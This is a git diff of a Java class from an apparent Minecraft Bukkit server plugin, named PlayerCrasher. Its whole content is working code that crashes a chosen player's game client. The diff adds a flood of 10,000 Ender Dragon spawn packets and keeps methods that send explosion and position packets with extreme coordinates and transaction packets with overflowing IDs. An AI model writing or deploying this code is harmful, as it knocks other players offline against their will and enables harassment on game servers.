@@ -1,22 +1,31 @@
 package pisi.unitedmeows.seriex.util.crasher;
 
-import java.util.*;
+import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.Collections;
+import java.util.List;
 import java.util.function.Function;
 
 import org.bukkit.Location;
+import org.bukkit.craftbukkit.v1_8_R3.CraftWorld;
 import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
 import org.bukkit.entity.Player;
 
-import net.minecraft.server.v1_8_R3.*;
+import net.minecraft.server.v1_8_R3.EntityEnderDragon;
+import net.minecraft.server.v1_8_R3.EntityPlayer;
+import net.minecraft.server.v1_8_R3.Packet;
+import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
+import net.minecraft.server.v1_8_R3.PacketPlayOutPosition;
+import net.minecraft.server.v1_8_R3.PacketPlayOutSpawnEntityLiving;
+import net.minecraft.server.v1_8_R3.PacketPlayOutTransaction;
+import net.minecraft.server.v1_8_R3.Vec3D;
 
-public enum PlayerCrasher {
-	INSTANCE;
-
-	public void fuck(Player player) {
+public class PlayerCrasher {
+	public static void fuck(Player player) {
 		Arrays.stream(CrashType.values()).forEach(value -> crash(player, value));
 	}
 
-	public void crash(Player player, CrashType type) {
+	public static void crash(Player player, CrashType type) {
 		EntityPlayer entityPlayer = ((CraftPlayer) player).getHandle();
 		Packet<?>[] calculate = type.calculate(player);
 		if (calculate != null) {
@@ -25,14 +34,14 @@ public enum PlayerCrasher {
 	}
 
 	public enum CrashType {
-		INVALID_BLOCK((Player player) -> {
-			Random random = new Random(System.currentTimeMillis());
-			Location location = player.getLocation();
-			for (int i = 0; i < 10; i++) {
-				player.sendBlockChange(location, random.nextInt(0x87D), (byte) 0);
+		ENTITY((Player player) -> {
+			for (int i = 0; i < 10_000; i++) {
+				EntityEnderDragon dragon = new EntityEnderDragon(((CraftWorld) player.getWorld()).getHandle());
+				Location location = player.getLocation();
+				dragon.setLocation(location.getBlockX(), location.getBlockY(), location.getBlockZ(), i % 360, 90);
+				PacketPlayOutSpawnEntityLiving packet = new PacketPlayOutSpawnEntityLiving(dragon);
+				((CraftPlayer) player).getHandle().playerConnection.sendPacket(packet);
 			}
-			player.sendBlockChange(location, -6666, (byte) 0);
-			player.sendBlockChange(location, 6666, (byte) 0);
 			return null;
 		}),
 		EXPLOSION((Player player) -> {
@@ -40,11 +49,10 @@ public enum PlayerCrasher {
 			double maxValue = 0x64 - 1E-4;
 			float impossibleFloat = Float.MAX_VALUE - 1E-4F;
 			double[] values = {
-				impossibleValue, maxValue, -impossibleValue, -maxValue
+						impossibleValue, maxValue, -impossibleValue, -maxValue
 			};
 			List<PacketPlayOutExplosion> packets = new ArrayList<>();
-			for (int i = 0; i < values.length; i++) {
-				double value = values[i];
+			for (double value : values) {
 				PacketPlayOutExplosion explosion = new PacketPlayOutExplosion(value, value, value, impossibleFloat, Collections.emptyList(), new Vec3D(value, value, value));
 				packets.add(explosion);
 			}
@@ -55,11 +63,10 @@ public enum PlayerCrasher {
 			double maxValue = 0x64 - 1E-4;
 			float impossibleFloat = Float.MAX_VALUE - 1E-4F;
 			double[] values = {
-				impossibleValue, maxValue, -impossibleValue, -maxValue
+						impossibleValue, maxValue, -impossibleValue, -maxValue
 			};
 			List<PacketPlayOutPosition> packets = new ArrayList<>();
-			for (int i = 0; i < values.length; i++) {
-				double value = values[i];
+			for (double value : values) {
 				PacketPlayOutPosition position = new PacketPlayOutPosition(value, value, value, impossibleFloat, impossibleFloat, Collections.emptySet());
 				packets.add(position);
 			}
@@ -68,7 +75,7 @@ public enum PlayerCrasher {
 		C0F((Player player) -> {
 			List<PacketPlayOutTransaction> packets = new ArrayList<>();
 			for (boolean fuck : new boolean[] {
-				true, false
+						true, false
 			}) {
 				packets.add(new PacketPlayOutTransaction(0x7FFFFFFF, (short) 0x7FFF, fuck));
 				packets.add(new PacketPlayOutTransaction(0x80000000, (short) 0x8000, fuck));
